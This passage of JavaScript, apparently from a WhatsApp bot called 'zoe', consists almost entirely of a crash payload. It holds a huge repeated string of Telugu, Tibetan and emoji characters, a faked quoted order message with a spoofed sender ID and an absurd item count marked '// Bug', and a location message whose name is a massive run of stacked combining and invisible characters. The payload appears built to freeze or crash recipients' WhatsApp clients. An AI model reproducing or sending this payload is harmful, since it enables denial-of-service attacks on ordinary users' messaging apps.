ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `zoe`,
    orderTitle: `combine`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logobot.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe     ̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̚̚͠͡